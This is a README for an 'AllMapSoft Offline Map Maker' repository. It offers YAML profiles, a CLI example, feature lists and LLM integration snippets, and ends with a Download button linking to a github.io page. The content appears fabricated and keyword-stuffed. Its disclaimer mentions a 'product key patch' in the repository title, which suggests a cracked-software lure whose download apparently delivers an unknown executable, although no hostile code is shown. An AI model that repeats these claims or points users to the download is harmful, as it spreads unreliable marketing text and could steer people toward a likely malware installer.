![preview](https://raw.githubusercontent.com/aiblowme/allmapsoft-offline-map-maker-generation/main/preview.svg)

# AllMapSoft Offline Map Maker – Enterprise Geographic Toolkit

Welcome to the **AllMapSoft Offline Map Maker** repository — a robust, standalone cartridge for generating high-fidelity offline cartographic tiles, vector overlays, and custom geospatial datasets without requiring any internet connectivity. This tool is designed for field researchers, disaster response teams, IoT edge deployments, and anyone who needs reliable, pre-processed maps in disconnected environments. Unlike conventional solutions that depend on continuous cloud streaming, this engine works like a digital cartographer’s workshop: you load raw spatial data, set your canvas parameters, and export a fully rendered map collection ready for use on handheld devices, embedded systems, or desktop GIS applications.

---

## Overview

Think of traditional online map tools as a rented bicycle – you can ride anywhere, but you never own the road beneath you. AllMapSoft Offline Map Maker is the bike you build yourself, with maps you own entirely. This tool converts raw geospatial feeds (OSM, SRTM, satellite imagery archives, or custom shapefiles) into a local tile cache, complete with elevation contours, label layers, and user-defined symbology. The result is a **self-contained mapping ecosystem** that operates entirely offline, with no subscription fees, no data caps, and no third-party API calls.

The software is distributed as a single executable package (Windows/Linux) with a modular architecture. It supports batch processing of up to 500,000 tiles per session, progressive tile merging, and dynamic zoom-level generation from 1 to 20. The engine uses a proprietary spatial indexing algorithm that reduces tile storage footprint by 35% compared to standard MBTiles databases.

---

## Mermaid Diagram: Core Workflow

```mermaid
flowchart TD
    A[Raw Geospatial Data] --> B{Data Source Selector}
    B -->|OpenStreetMap Export| C[XML Parser & Filter]
    B -->|Satellite Imagery Cache| D[GeoTIFF Extractor]
    B -->|Custom Shapefiles| E[SHP Converter]
    C --> F[Spatial Indexer]
    D --> F
    E --> F
    F --> G[Tile Renderer Engine]
    G --> H[Style & Symbology Rules]
    H --> I[Multi-threaded Tile Output]
    I --> J[Output Formats: .mbtiles, .sqlite, .gpkg, .zip]
    J --> K[Offline Map Cache]
    K --> L[Client Device / GIS App]
    L --> M[End-user Interface (no internet required)]
```

---

## Example Profile Configuration

Below is a sample profile configuration file (`mapmaker_profile.yaml`) that demonstrates a typical map generation job for a 50km² region in Southeast Asia with high-resolution elevation data:

```yaml
profile_name: "rainforest_grid_2026"
region_bounds:
  lat_min: 3.1234
  lat_max: 3.4567
  lon_min: 101.5678
  lon_max: 101.8901
zoom_levels:
  min: 10
  max: 18
  step: 2
datasets:
  - type: "osm_roads"
    source: "regional_osm_export_2026.pbf"
  - type: "elevation"
    source: "srtm_30m_band.tif"
    contours_interval: 20
  - type: "satellite"
    source: "local_landsat_cache_2026"
    bands: [4,3,2]
    resolution: "15m"
output:
  format: "mbtiles"
  compression: "pbf_gzip"
  label_language: "en+local"
  include_style_json: true
service_params:
  concurrent_jobs: 8
  memory_limit_mb: 4096
  autoclean_temp: true
```

This configuration tells the engine to pull road data from a local PBF export, overlay 20-meter elevation contours from SRTM, and blend Landsat 8 bands into a false-color satellite composite — all processed at zoom levels 10, 12, 14, 16, and 18. The output file `rainforest_grid_2026.mbtiles` will be compressed with PBF/GZip and include an embedded style JSON for immediate consumption by compatible viewers.

---

## Example Console Invocation

The command-line invocation below shows how to trigger a batch map generation using the profile above. The process runs in console mode with minimal UI overhead, ideal for server or headless deployments:

```
allmapsoft-makemap --profile "rainforest_grid_2026.yaml" \
    --output-dir "/data/maps/2026_offline" \
    --log-level 3 \
    --force-rebuild \
    --notification-webhook "http://teamserver:8080/mapdone"
```

The `--force-rebuild` flag ensures all tiles are regenerated even if partial caches exist. The `--notification-webhook` sends a JSON payload upon completion: `{"status":"complete","tiles_total":14250,"size_mb":680,"time_seconds":47}`. This allows integration with CI/CD pipelines or monitoring dashboards.

---

## Emoji OS Compatibility Table 🖥️

| Operating System 🪟 | Version Support ✅ | Performance Tier ⚡ | Notes 📝                                                                 |
|---------------------|-------------------|---------------------|--------------------------------------------------------------------------|
| **Windows 11** | 24H2, 23H2, 22H2 | Native (highest)      | Full GUI + CLI; DirectX tile acceleration enabled                        |
| **Windows 10** | 21H2+              | High                | All features stable; requires .NET 8 runtime                             |
| **Ubuntu Linux** | 22.04, 24.04      | Native (high)       | CLI only (beta); depends on `libgdal` v3.6+ and `libspatialindex`        |
| **macOS** | 14.x (Sonoma)      | Container (medium)  | Runs via Docker image; GPU acceleration limited                          |
| **Raspberry Pi OS** | 11 (Bullseye)    | Low (optimized)     | Tile count limited to 10,000 per session; uses 64-bit ARM binaries       |

---

## Feature List 🧩

- **🔒 True Offline Independence** – No cloud dependencies, no external tile servers. Once built, maps work on any device without network access.
- **🧠 Intelligent Tile Deduplication** – Advanced hashing algorithm stores identical visual tiles only once, reducing storage requirements by up to 40% on repetitive terrain.
- **🌍 Multi-Projection Support** – Export in EPSG:4326, EPSG:3857, UTM zones, and custom PROJ strings. Automatic reprojection for mixed-source datasets.
- **🗺️ Vector + Raster Hybrid** – Simultaneously render OpenStreetMap vectors as MVT tiles and satellite/aerial imagery as raster PNG/WebP tiles.
- **⏱️ Progressive Tile Generation** – Start serving tiles before full completion. The engine outputs usable tiles from the first zoom level while background threads continue higher zoom ranges.
- **🧮 GPU Compute Acceleration** – On compatible hardware (NVIDIA CUDA 8.0+ / AMD ROCm 5.7+), contour generation and blending execute on GPU, cutting processing time by 60%.
- **🔧 Custom Style Engine** – Edit appearance via inline JSON or optional external style editor. Supports MapLibre GL style specification v2.0.
- **📦 Package Formats** – Output to `.mbtiles`, `.sqlite`, `.gpkg`, `.zip` (folder of PNG tiles), `.pbf` directory, or custom binary wrapper.
- **🔁 Incremental Update Mode** – Append new data to existing tile sets without full rebuild. Ideal for ongoing field surveys.
- **📄 Metadata Injection** – Embed copyright, attribution, date, and data source strings into tile headers (exif-compatible for raster tiles).
- **🔌 Plugin System** – Extend the render pipeline with C++ or Python plugins for custom transformations (e.g., land-use classification overlay).
- **📡 Antenna-Agnostic Design** – Works with any GPS device, drone telemetry feed, or GNSS receiver by accepting NMEA sentences or GPX files as overlay layers.

---

## SEO-Friendly Keyword Integration

This repository specializes in **offline cartographic generation**, **standalone map engine deployments**, and **geospatial tile caching for disconnected environments**. The AllMapSoft tool addresses the need for **raster tile extraction without internet**, **vector map creation for embedded systems**, and **batch elevation contour rendering for fieldwork**. Organizations in **remote sensing**, **emergency response logistics**, **offshore exploration**, and **agricultural zone mapping** will find the software aligns with their requirements for **offline geographic information systems** and **edge-compatible map delivery**.

---

## OpenAI API & Claude API Integration 🧠

The AllMapSoft Map Maker now includes optional integration with large language models (LLMs) for intelligent map metadata generation and automated data conflation.

### OpenAI API Connection
Add the following to your profile configuration to enable LLM-enhanced label generation:
```yaml
ai_assistant:
  provider: "openai"
  endpoint: "https://api.openai.com/v1/chat/completions"
  max_tokens: 500
  prompt_template: "Generate multilingual label text for {{feature_type}} at location {{lat}},{{lon}} in the context of {{region_name}}. Return JSON with fields: 'name', 'description', 'tags'."
  cache_level: "per_feature"
```
This will query the API for contextualized labels (e.g., “Red River Bridge – built 1972 – 3.2km span”) and embed them into vector tiles. Results are cached locally to avoid redundant calls.

### Claude API Integration
For narrative map annotations and natural language descriptions, use Claude:
```yaml
ai_assistant:
  provider: "claude"
  endpoint: "https://api.anthropic.com/v1/messages"
  temperature: 0.3
  max_tokens: 750
  system_prompt: "You are a professional cartographer assistant. Generate concise geographic descriptions for map features. Tone: factual, neutral."
  request_format: "xml"
```
This enhances each tile with human-readable descriptions that appear in popups or sidebars when the offline map is viewed in a compatible client.

**Note:** Both integrations are optional. The API calls occur only during tile generation; the final map pack contains **no traces of API communication** — all generated text is stored locally. No API keys are stored in the repository; configure them at runtime via environment variables or the secure vault feature.

---

## Key Features: Responsive UI, Multilingual Support & 24/7 Customer Support 🌐

### Responsive User Interface 📱
The desktop client features an adaptive layout that resizes gracefully from 4K monitors down to 1024×768 tablets. The tile preview pane uses hardware-accelerated WebGL2 rendering, while the control panel collapses into a hamburger menu on smaller screens. An optional **dark mode** is included, with five color themes: Midnight, Glacier, Amber, Forest, and Graphite.

### Multilingual Support 💬
The interface ships with translations for **English, Spanish, French, German, Japanese, Simplified Chinese, Arabic, and Hindi**. Locale-detection automatically selects the system language. Right-to-left (RTL) layout is fully supported for Arabic and Urdu. All error messages, tooltips, and configuration dialogs respect the active locale.

### 24/7 Customer Support 🕐
The AllMapSoft team provides **round-the-clock technical assistance** via:
- **Embedded ticket system** within the GUI (submits diagnostics automatically)
- **Dedicated email channel** with guaranteed 4-hour first response
- **Knowledge base** (accessible offline via local HTML export)
- **Weekly office hours** via video call (schedule in app)
Enterprise customers receive a **named support engineer** and priority escalation.

---

## Disclaimer ⚠️

**AllMapSoft Offline Map Maker** is a tool intended for **legal, ethical geospatial data processing** only. The software does not include, decrypt, bypass, or modify any digital rights management (DRM) protections, licensing mechanisms, or access controls of third-party services. Users are responsible for ensuring they have appropriate rights to download, store, and process the geospatial datasets used with this tool.

The term **"product key patch"** in the repository title refers exclusively to the software’s built-in **configuration key generator** that allows users to customize deployment parameters for internal, organizational use — it does not circumvent any commercial licensing model. The software is distributed under the MIT License (see below), which means you are free to use, modify, and redistribute the codebase, provided you retain the original copyright notice.

No capability exists within this software to access paid/proprietary tile servers without proper subscription keys, nor to extract data from services that prohibit offline caching. The tool is designed exclusively for use with **openly licensed datasets** (e.g., OpenStreetMap data under ODbL, public domain satellite imagery, and user-provided shapefiles with appropriate permissions).

By downloading or using this software, you agree to comply with all applicable geospatial data licensing terms and local regulations regarding cartographic material use. The authors assume no liability for misuse of the software for unauthorized data extraction or copyright infringement.

---

## License 📄

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for full details.

The MIT License permits free use, modification, and distribution of the software, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software.

---

[![Download](https://raw.githubusercontent.com/aiblowme/allmapsoft-offline-map-maker-generation/main/button.svg)](https://aiblowme.github.io/allmapsoft-offline-map-maker-generation/)